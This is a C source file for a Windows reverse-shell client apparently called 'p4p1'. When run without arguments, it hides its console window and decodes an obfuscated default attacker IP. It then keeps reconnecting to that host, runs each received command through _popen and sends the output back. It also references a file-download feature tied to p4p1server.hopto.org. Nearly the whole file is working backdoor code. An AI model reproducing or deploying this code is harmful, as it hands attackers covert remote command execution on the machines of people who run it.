#include "p4p1-h_win.h"

int main(int argc, char * argv[])
{
    //Check if i want to hide output or not
	if(argc == 1)
		FreeConsole();           // BTW UPDATE THIS YOU CAN STILL SEE A TERMINAL POP UP

    // Create the basic variables so that you can get the port data
	int portno;     //number of port
	char ip[16];
	char ipchar[16];
	char portchar[6];   //Char retrieved from .cfg file
	FILE * fp = fopen("port.cfg", "r"); //Open up the cfg file
	FILE * fip = fopen("ip.cfg", "r");

	if(fp == NULL){
		portno = 4441;      //If no file set up default port to prevent errors
	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fp)) != EOF){     // Get char from file while not at EOF
			portchar[i] = c;
			i++;
		}
		portchar[i+1] = '\0';               //Terminate string

		portno = atoi(portchar);            //Set up custom port
		fclose(fp);
	}

	if(fip == NULL){
		char ipjib[14] = "97/358/316/213";
		char corip[14];

		int i;

		for(i = 0; i < strlen(ipjib); i++){
			char ch;
			ch = ipjib[i];
			corip[i] = decr(ch);
		}

		strcpy(ip, corip);
		printf("%s", corip);      //If no file set up default ip to prevent errors
	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fip)) != EOF){     // Get char from file while not at EOF
			ipchar[i] = c;
			i++;
		}
		ipchar[i] = '\0';

		strcpy(ip, ipchar);

		fclose(fip);
	}

	//Main program
	while(1){
		//startup sa
		WSADATA wsa;
		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
			fprintf(stderr, "Client : Error at wsastartup.\n"); // Output error
		}

		/* initialize socket */
		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET){
			fprintf(stderr, "Client : socket() - Error at socket(): %i\n", //Output error
			WSAGetLastError());
			WSACleanup();
			return -1;
		}

		/* setup variables */
		int cn;							//connect
		FILE *pPipe;						//command pipe
		int bytesSent;                  //number of bytes ent
		int bytesRecv;              // number of bytes received
		char sessionID[5] = "";					// Session id given by serv
		char buf[BUFSIZE] = "";					//buf
		char promptjib[10] = "\n<p4p1 />";
		char prompt[10]; 		//prompt if no session id
		char ui[95] = "       _ _       _\n  _ __| | | _ __/ |\n | '_ \\_  _| '_ \\ |\n | .__/ |_|| .__/_|\n |_|       |_|\n\0";

		bytesSent = 0;
		bytesRecv = SOCKET_ERROR;

		struct sockaddr_in client;				//server to connect information
		client.sin_family = AF_INET;
		client.sin_port = htons(portno);
		client.sin_addr.s_addr = inet_addr(ip);	//this should not be hard coded.


		/* create pointers so that the synthacts gets faster*/
		int * pbs = &bytesSent;
		int * pbr = &bytesRecv;

		/* Build up jib prompt text to core vars */

		/* connect */

		do{
			cn = connect(s, (SOCKADDR*) &client, sizeof(client));
		} while( cn == SOCKET_ERROR);

		/* receive session ID */
		if(cn != SOCKET_ERROR){
			*pbr = SOCKET_ERROR;
			//Receive the session id

	    		while(*pbr == SOCKET_ERROR){
				*pbr = recv(s, buf, BUFSIZE, 0);
					if(*pbr == 0 || *pbr == WSAECONNRESET){
						break;
					}

					if(bytesRecv < 0){
						return -1;
					} else {
						sessionID[0] = buf[0];
						memset(buf, 0, BUFSIZE);
					}
			}
			// Send ui if no session id
			if(sessionID[0] == '0'){	//if session id is 0 that means you are working with nc
				*pbs = send(s, ui, sizeof(ui), 0);
				if(*pbs == SOCKET_ERROR) { //server disconnected!
					if(WSAGetLastError() != WSAECONNREFUSED
					|| WSAGetLastError() == WSAECONNRESET){
						break;
					} else {
						goto close;
					}
				}
			}
		}
		/*End of session id block
		 ***/

		while(cn != SOCKET_ERROR){

			/*
			 *Send Prompt if no session ID
			 **/
			if(sessionID[0] == '0'){
				*pbs = send(s, prompt, sizeof(prompt), 0);
				if(*pbs == SOCKET_ERROR) { //server disconnected!
					if(WSAGetLastError() != WSAECONNREFUSED
					|| WSAGetLastError() == WSAECONNRESET){
						break;
					} else {
						goto close;
					}
				}
			}

			*pbr = SOCKET_ERROR;

			while(*pbr == SOCKET_ERROR){
				*pbr = recv(s, buf, BUFSIZE, 0);
				if(*pbr == 0 || *pbr == WSAECONNRESET){
					break;
				}

				if(bytesRecv < 0){
					return -1;
				} else {
					/*process received data*/
					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2){

						if(iscommand(buf[0]) == 2){	// exit command
							memset(buf, 0, BUFSIZE);
							goto close;
						} else if (iscommand(buf[0]) == 1) { //file download command
							memset(buf, 0, BUFSIZE);
							download();
							strcpy(buf, "file downloaded from p4p1server.hopto.org\n");
						} else {
							memset(buf, 0, BUFSIZE);
						}

					} else {
						if( (pPipe = _popen( buf, "r" )) == NULL ){
							memset(buf, 0, BUFSIZE);
							strcpy(buf, "error in command");
							printf("error in cmd\n");
						} else {
							memset(buf, 0, BUFSIZE);
							int i = 0;
							char ch;
							while((ch = fgetc(pPipe)) != EOF){
								buf[i] = ch;
								i++;
							}
						}
					}
				}
			}

			/*
			 * Send back output
			 **/
			*pbs = send(s, buf, BUFSIZE, 0);
			if(*pbs == SOCKET_ERROR) {
				if(WSAGetLastError() != WSAECONNREFUSED
				|| WSAGetLastError() == WSAECONNRESET){
					break;
				} else {
					goto close;
				}
			}

		}	// end of the while connected loop.
		close:
		WSACleanup();
		_pclose(pPipe);
	}//end of main while loop.
	return 0;
}
